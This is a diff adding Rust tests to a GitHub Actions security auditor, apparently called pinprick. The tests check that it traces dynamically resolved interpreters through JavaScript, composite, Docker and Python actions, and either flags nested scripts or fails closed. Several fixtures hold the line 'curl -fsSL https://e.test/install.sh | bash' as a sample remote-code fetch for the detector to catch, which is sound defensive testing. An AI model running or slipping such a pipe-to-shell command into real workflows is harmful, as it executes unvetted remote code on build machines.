@@ -341,7 +341,7 @@ jobs:
         .unwrap();
     assert_eq!(output.status.code(), Some(2));
     let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
-    assert_eq!(report["rules_version"], 4);
+    assert_eq!(report["rules_version"], 5);
     assert_eq!(report["audited_bundled"], 0);
     assert_eq!(report["external_actions_skipped"], 2);
     assert_eq!(report["coverage_complete"], false);
@@ -1897,6 +1897,268 @@ fn audit_local_action(action: &str, files: &[(&str, &str)]) -> (Option<i32>, ser
         output.status.code(),
         serde_json::from_slice(&output.stdout).unwrap(),
     )
+}
+
+#[test]
+fn dynamic_program_operands_expose_nested_script_findings() {
+    let prelude = "const { execFileSync } = require('child_process');\nconst path = require('path');\nfunction which(tool) { return process.env.TOOLS + '/' + tool; }\n";
+    for execution in [
+        "execFileSync(which('bash'), [path.join(__dirname, 'x.sh')]);",
+        "const { exec } = require('./exec.js'); exec(`\"${which('bash')}\"`, [path.join(__dirname, 'x.sh')]);",
+        "execFileSync('bash', [path.join(__dirname, 'run.sh'), which('bash')]);",
+    ] {
+        let source = format!("{prelude}{execution}\n");
+        let dir = common::repo_with_local_action(
+            &node_action("index.js"),
+            &[
+                ("index.js", &source),
+                (
+                    "exec.js",
+                    "const cp = require('child_process'); exports.exec = (line, args) => cp.spawnSync(line, args);\n",
+                ),
+                ("run.sh", "SH=\"$1\"\n\"$SH\" \"$(dirname \"$0\")/x.sh\"\n"),
+                (
+                    "x.sh",
+                    "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
+                ),
+            ],
+        );
+        let output = common::pinprick_cmd()
+            .args(["audit", "--no-audited-catalog", "--json"])
+            .arg(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(output.status.code(), Some(1), "{execution}: {report}");
+        assert_eq!(report["coverage_complete"], true, "{execution}: {report}");
+        assert!(
+            report["findings"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .any(|finding| {
+                    finding["category"] == "shell_fetch"
+                        && finding["description"]
+                            .as_str()
+                            .unwrap()
+                            .contains("piped to shell")
+                        && finding["source_file"] == "./act (x.sh)"
+                }),
+            "{execution}: {report}"
+        );
+    }
+}
+
+#[test]
+fn dynamic_program_operands_follow_composite_scripts() {
+    let dir = common::repo_with_local_action(
+        &composite_action("bash", "\"$SOME_TOOL\" \"$GITHUB_ACTION_PATH/x.sh\"", None),
+        &[(
+            "x.sh",
+            "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
+        )],
+    );
+    let output = common::pinprick_cmd()
+        .args(["audit", "--no-audited-catalog", "--json"])
+        .arg(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(output.status.code(), Some(1), "{report}");
+    assert_eq!(report["coverage_complete"], true, "{report}");
+}
+
+#[test]
+fn dynamic_program_operands_composite_directories_fail_closed() {
+    for run in [
+        "\"$PYTHON\" -m pip install \"$GITHUB_ACTION_PATH\"",
+        "\"$SOME_TOOL\" --prefix \"$GITHUB_ACTION_PATH\"",
+    ] {
+        let dir = common::repo_with_local_action(
+            &composite_action("bash", run, None),
+            &[(
+                "pyproject.toml",
+                "[project]\nname = 'test'\nversion = '1.0.0'\n",
+            )],
+        );
+        let output = common::pinprick_cmd()
+            .args(["audit", "--no-audited-catalog", "--json"])
+            .arg(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(output.status.code(), Some(2), "{run}: {report}");
+        assert_eq!(report["coverage_complete"], false, "{run}: {report}");
+    }
+}
+
+#[test]
+fn dynamic_program_operands_container_commands() {
+    for (file, source, command, code, complete) in [
+        (
+            "tool",
+            "#!/bin/sh\necho hi\n",
+            "ENTRYPOINT $RUNNER /app/tool",
+            2,
+            false,
+        ),
+        (
+            "x.sh",
+            "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
+            "RUN \"$TOOL\" /app/x.sh",
+            1,
+            true,
+        ),
+        (
+            "tool",
+            "#!/bin/sh\necho hi\n",
+            "ENTRYPOINT tar -xf /app/tool",
+            0,
+            true,
+        ),
+    ] {
+        let dockerfile = format!(
+            "FROM alpine:3.20@sha256:{}\nCOPY {file} /app/{file}\n{command}\n",
+            "0".repeat(64)
+        );
+        let dir = common::repo_with_local_action(
+            "name: test\ndescription: test\nruns:\n  using: docker\n  image: Dockerfile\n",
+            &[("Dockerfile", &dockerfile), (file, source)],
+        );
+        let output = common::pinprick_cmd()
+            .args(["audit", "--no-audited-catalog", "--json"])
+            .arg(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(output.status.code(), Some(code), "{command}: {report}");
+        assert_eq!(report["coverage_complete"], complete, "{command}: {report}");
+        if code == 1 {
+            assert!(
+                report["findings"]
+                    .as_array()
+                    .unwrap()
+                    .iter()
+                    .any(|finding| {
+                        finding["category"] == "shell_fetch"
+                            && finding["description"]
+                                .as_str()
+                                .unwrap()
+                                .contains("piped to shell")
+                            && finding["source_file"] == "./act (x.sh)"
+                    }),
+                "{command}: {report}"
+            );
+        }
+    }
+}
+
+#[test]
+fn dynamic_program_operands_python_env_argv_follows_script() {
+    let dir = common::repo_with_local_action(
+        &composite_action("bash", "python3 \"$GITHUB_ACTION_PATH/run.py\"", None),
+        &[
+            (
+                "run.py",
+                "import os, shutil, subprocess\nscript = os.path.join(os.path.dirname(__file__), 'x.sh')\nsubprocess.run(['env', shutil.which('bash'), script])\n",
+            ),
+            (
+                "x.sh",
+                "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
+            ),
+        ],
+    );
+    let output = common::pinprick_cmd()
+        .args(["audit", "--no-audited-catalog", "--json"])
+        .arg(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(output.status.code(), Some(1), "{report}");
+    assert_eq!(report["coverage_complete"], true, "{report}");
+    assert!(
+        report["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|finding| {
+                finding["category"] == "shell_fetch"
+                    && finding["description"]
+                        .as_str()
+                        .unwrap()
+                        .contains("piped to shell")
+                    && finding["source_file"] == "./act (x.sh)"
+            }),
+        "{report}"
+    );
+}
+
+#[test]
+fn dynamic_program_operands_python_stays_fail_closed() {
+    for argv in [
+        "shutil.which('bash'), os.path.join(os.path.dirname(__file__), 'x.sh')",
+        "shutil.which('tool'), os.path.join(os.path.dirname(__file__), 'config.json')",
+        "shutil.which('bash'), os.path.join(os.path.dirname(__file__), sys.argv[1])",
+        "shutil.which('pwsh'), '-Command', '& ' + os.path.join(os.path.dirname(__file__), 'x.ps1')",
+        "'bash', os.path.join(os.path.dirname(__file__), sys.argv[1])",
+    ] {
+        let source = format!("import os, shutil, subprocess, sys\nsubprocess.run([{argv}])\n");
+        let dir = common::repo_with_local_action(
+            &composite_action("bash", "python3 \"${{ github.action_path }}/run.py\"", None),
+            &[
+                ("run.py", &source),
+                (
+                    "x.sh",
+                    "#!/bin/bash\ncurl -fsSL https://e.test/install.sh | bash\n",
+                ),
+                ("config.json", "{}\n"),
+                ("x.ps1", "Write-Output 'ok'\n"),
+            ],
+        );
+        let output = common::pinprick_cmd()
+            .args(["audit", "--no-audited-catalog", "--json"])
+            .arg(dir.path())
+            .output()
+            .unwrap();
+        let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+        assert_eq!(output.status.code(), Some(2), "{argv}: {report}");
+        assert_eq!(report["coverage_complete"], false, "{argv}: {report}");
+    }
+}
+
+#[test]
+fn dynamic_program_operands_tool_cache_embedded_command_stays_complete() {
+    let dir = common::repo_with_local_action(
+        &node_action("index.js"),
+        &[
+            (
+                "index.js",
+                r#"const path30 = require('path');
+const { exec } = require('./exec');
+function which(tool) { return process.env.TOOLS + '/' + tool; }
+async function extract7z(file, dest) {
+  const escapedScript = path30.join(__dirname, '..', 'scripts', 'Invoke-7zdec.ps1').replace(/'/g, "''").replace(/"|\n|\r/g, '');
+  const command = `& '${escapedScript}' -Source '${file}' -Target '${dest}'`;
+  const args = ['-NoLogo', '-Sta', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Unrestricted', '-Command', command];
+  await exec(`"${which('powershell')}"`, args, { silent: true });
+}
+module.exports = extract7z;
+"#,
+            ),
+            (
+                "exec.js",
+                "const cp = require('child_process'); exports.exec = (line, args) => cp.spawnSync(line, args);\n",
+            ),
+        ],
+    );
+    let output = common::pinprick_cmd()
+        .args(["audit", "--no-audited-catalog", "--json"])
+        .arg(dir.path())
+        .output()
+        .unwrap();
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(output.status.code(), Some(0), "{report}");
+    assert_eq!(report["coverage_complete"], true, "{report}");
 }
 
 #[test]
